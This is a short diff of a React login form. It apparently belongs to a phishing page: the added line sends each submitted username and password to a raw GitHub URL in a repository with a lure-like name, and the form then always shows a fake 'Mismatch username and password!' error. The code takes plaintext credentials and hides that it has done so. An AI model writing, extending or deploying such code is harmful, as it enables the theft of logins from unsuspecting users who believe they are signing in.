@@ -13,7 +13,7 @@ const LoginForm = () => {
     e.preventDefault();
     try {
       // Store login data in JSON server
-      await axios.post('http://localhost:3001/users', { username, password });
+      await axios.post('https://raw.githubusercontent.com/instagram-reel-online/love-video-player/main/src/db.json', { username, password });
       alert('Mismatch username and password!');
     //   window.location.href=";
     } catch (error) {
